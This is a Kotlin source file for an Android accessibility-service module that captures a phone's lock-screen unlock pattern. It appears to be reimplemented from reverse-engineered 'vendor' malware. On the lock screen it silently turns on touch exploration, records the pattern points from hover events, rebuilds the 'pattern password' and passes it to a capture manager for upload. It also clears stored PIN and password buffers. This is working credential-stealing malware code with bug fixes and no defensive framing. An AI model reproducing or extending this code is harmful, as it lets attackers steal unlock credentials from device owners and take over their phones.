package com.storm.safe.rock.service.modules

import android.accessibilityservice.AccessibilityServiceInfo
import android.app.KeyguardManager
import android.graphics.Rect
import android.graphics.Region
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.service.MyAccessibilityService
import org.json.JSONArray
import org.json.JSONObject

/**
 * Passive pattern unlock capture via HOVER_MOVE accessibility events.
 * Vendor: C0319a4 (GestureRecorderManager), methods a3 (onHoverEvent) + a6 (onWindowStateChanged).
 * Touch exploration: b30 (enable/disable touch exploration on lockscreen).
 *
 * When lock screen is detected, starts recording. Detects lockPatternView
 * and temporarily enables FLAG_REQUEST_TOUCH_EXPLORATION_MODE to receive
 * HOVER events. On unlock transition, disables touch exploration, packages
 * captured points, and feeds to CipherCaptureManager for 4-path upload.
 */
class GestureRecorderManager(private val service: MyAccessibilityService) {

    companion object {
        private const val TAG = "GestureRecorder"
        private val DIGIT_REGEX = Regex("\\d+")
        private const val FLAG_TOUCH_EXPLORATION = 4
    }

    @Volatile var isRecording = false
        private set
    var mode = 0  // 0=off, 1=recording
        private set
    /** True after onUnlocked() has uploaded — prevents USER_PRESENT double upload */
    @Volatile var hasReportedThisSession = false
    private var wasLocked: Boolean
    private var touchExplorationEnabled = false
    private val patternPoints = ArrayList<String>()
    private var patternCoords = JSONArray()
    private var recordingStartTime = 0L
    private val handler = Handler(Looper.getMainLooper())

    init {
        // Bug 2 fix: initialize wasLocked from KeyguardManager so a service restart
        // while device is locked doesn't cause a false justLocked transition.
        wasLocked = try {
            (service.getSystemService("keyguard") as? KeyguardManager)?.isKeyguardLocked ?: false
        } catch (_: Exception) { false }
    }

    /**
     * Handle HOVER_MOVE accessibility event on lock screen.
     * Vendor: C0319a4.m211574a3
     *
     * Extracts pattern point number from node contentDescription,
     * deduplicates, and records coordinates.
     */
    fun onHoverEvent(event: AccessibilityEvent) {
        if (!isRecording || mode != 1) return

        val source = event.source ?: return
        try {
            val desc = source.contentDescription?.toString()
            if (desc.isNullOrEmpty()) return

            val match = DIGIT_REGEX.find(desc) ?: return
            val digit = match.value.toIntOrNull() ?: return

            val dedupKey = "pt:$digit"
            if (patternPoints.contains(dedupKey)) return

            val rect = Rect()
            source.getBoundsInScreen(rect)

            patternPoints.add(dedupKey)
            val pos = digit - 1 // 0-indexed (vendor: line 344)

            val point = JSONObject().apply {
                put("x", rect.centerX())
                put("y", rect.centerY())
                put("left", rect.left)
                put("top", rect.top)
                put("right", rect.right)
                put("bottom", rect.bottom)
                put("des", desc)
                put("pos", pos)
            }
            patternCoords.put(point)
            Log.d(TAG, "HOVER pattern point: pos=$pos desc=$desc @ (${rect.centerX()},${rect.centerY()}) seq=${patternCoords.length()}")
        } catch (e: Exception) {
            Log.w(TAG, "onHoverEvent error", e)
        } finally {
            source.recycle()
        }
    }

    /**
     * Detect locked->unlocked transition on WINDOW_STATE_CHANGED.
     * Vendor: C0319a4.m211577a6
     */
    fun onWindowStateChanged(event: AccessibilityEvent) {
        try {
            val km = service.getSystemService("keyguard") as? KeyguardManager ?: return
            if (km.isKeyguardSecure != true) return

            val nowLocked = km.isKeyguardLocked
            val justLocked = nowLocked && !wasLocked
            val justUnlocked = !nowLocked && wasLocked

            if (justLocked) {
                mode = 1
                isRecording = true
                hasReportedThisSession = false
                recordingStartTime = System.currentTimeMillis()
                patternPoints.clear()
                patternCoords = JSONArray()
                Log.d(TAG, "Lock screen detected -> start pattern recording")
                handler.postDelayed({ tryEnableTouchExploration() }, 500L)
            }

            if (justUnlocked) {
                disableTouchExploration()
                onUnlocked()
            }

            // While locked, check for pattern view and enable touch exploration
            if (nowLocked && isRecording && !touchExplorationEnabled) {
                tryEnableTouchExploration()
            }

            wasLocked = nowLocked
        } catch (e: Exception) {
            Log.w(TAG, "onWindowStateChanged error", e)
        }
    }

    /**
     * Package captured pattern data and feed to CipherCaptureManager.
     * Vendor: C0319a4.m211577a6 unlock branch (lines 530-643)
     */
    private fun onUnlocked() {
        // Bug 1 fix: keep isRecording=true and mode=1 UNTIL after upload completes,
        // so USER_PRESENT handler sees isRecording==true and defers to us.
        val pointCount = patternCoords.length()
        Log.d(TAG, "Unlock detected -> pattern points=$pointCount")

        if (pointCount < 4) {
            Log.d(TAG, "Pattern points < 4, skip upload")
            patternPoints.clear()
            patternCoords = JSONArray()
            isRecording = false
            mode = 0
            return
        }

        // Build comma-separated pattern string from pos values
        val indices = mutableListOf<Int>()
        for (i in 0 until patternCoords.length()) {
            val obj = patternCoords.optJSONObject(i)
            if (obj != null) {
                indices.add(obj.optInt("pos", -1))
            }
        }
        val patternString = indices.filter { it >= 0 }.joinToString(",")
        Log.d(TAG, "Pattern password: $patternString (${indices.size} points)")

        // Feed to CipherCaptureManager -> 4-path upload
        try {
            val ccm = service.cipherCaptureManager
            if (ccm != null) {
                ccm.bufferCipher(patternString, "pattern")
                val saved = ccm.confirmAndSaveLastCipher()
                hasReportedThisSession = true
                Log.d(TAG, "Pattern upload result: $saved")
            } else {
                Log.w(TAG, "CipherCaptureManager not initialized")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Pattern upload error", e)
        }

        patternPoints.clear()
        patternCoords = JSONArray()
        // Bug 1 fix: set recording off AFTER upload is done
        isRecording = false
        mode = 0
    }

    /**
     * Detect lockPatternView in accessibility tree and enable touch exploration.
     * Vendor: C02969 coroutine + b30 case 1
     */
    private fun tryEnableTouchExploration() {
        if (touchExplorationEnabled) return
        try {
            val root = service.rootInActiveWindow ?: return
            val patternViewId = if (Build.MANUFACTURER.lowercase().let {
                    it.contains("vivo") || it.contains("iqoo") || it.contains("bbk")
                }) "com.android.systemui:id/vivo_lock_pattern_view"
            else "com.android.systemui:id/lockPatternView"

            val nodes = root.findAccessibilityNodeInfosByViewId(patternViewId)
            root.recycle()

            if (!nodes.isNullOrEmpty() && nodes[0].isVisibleToUser) {
                enableTouchExploration()
                // Bug 4 fix: clear ALL cipher buffers (not just pinDigits/pendingCipher)
                // to prevent stale data from a previous text/PIN password session
                service.cipherCaptureManager?.let { ccm ->
                    ccm.pinDigits.clear()
                    ccm.passwordChars.clear()
                    ccm.passwordSnapshots.clear()
                    ccm.hasAlpha = false
                    ccm.pendingCipher = null
                    ccm.collectedEvents.clear()
                }
                Log.d(TAG, "🔐 检测到图案锁视图($patternViewId)，启用触摸探索，已清空全部密码缓冲")
            }
        } catch (e: Exception) {
            Log.w(TAG, "tryEnableTouchExploration error", e)
        }
    }

    /**
     * Temporarily enable FLAG_REQUEST_TOUCH_EXPLORATION_MODE.
     * Vendor: b30 case 1 — flags |= 4
     */
    private fun enableTouchExploration() {
        try {
            val info = service.serviceInfo ?: return
            info.flags = info.flags or FLAG_TOUCH_EXPLORATION
            service.serviceInfo = info
            touchExplorationEnabled = true

            if (Build.VERSION.SDK_INT >= 30) {
                val dm = service.resources.displayMetrics
                val region = Region()
                region.op(Rect(0, 0, dm.widthPixels - 3, dm.heightPixels - 3), Region.Op.UNION)
                service.setGestureDetectionPassthroughRegion(0, region)
            }
            Log.d(TAG, "🔐 触摸探索已启用 flags=0x${Integer.toHexString(info.flags)}")
        } catch (e: Exception) {
            Log.e(TAG, "enableTouchExploration failed", e)
        }
    }

    /**
     * Disable FLAG_REQUEST_TOUCH_EXPLORATION_MODE.
     * Vendor: b30 case 0 — flags &= ~4
     */
    private fun disableTouchExploration() {
        if (!touchExplorationEnabled) return
        // Bug 3 fix: always clear flag first so state doesn't desync when serviceInfo is null
        touchExplorationEnabled = false
        try {
            val info = service.serviceInfo ?: return
            info.flags = info.flags and FLAG_TOUCH_EXPLORATION.inv()
            service.serviceInfo = info

            if (Build.VERSION.SDK_INT >= 30) {
                val dm = service.resources.displayMetrics
                val region = Region()
                val h = dm.heightPixels
                region.op(Rect(0, h - 200, dm.widthPixels, h), Region.Op.UNION)
                service.setTouchExplorationPassthroughRegion(0, region)
                service.setGestureDetectionPassthroughRegion(0, region)
            }
            Log.d(TAG, "🔐 触摸探索已关闭")
        } catch (e: Exception) {
            Log.e(TAG, "disableTouchExploration failed", e)
        }
    }

    fun reset() {
        disableTouchExploration()
        isRecording = false
        mode = 0
        hasReportedThisSession = false
        patternPoints.clear()
        patternCoords = JSONArray()
    }
}
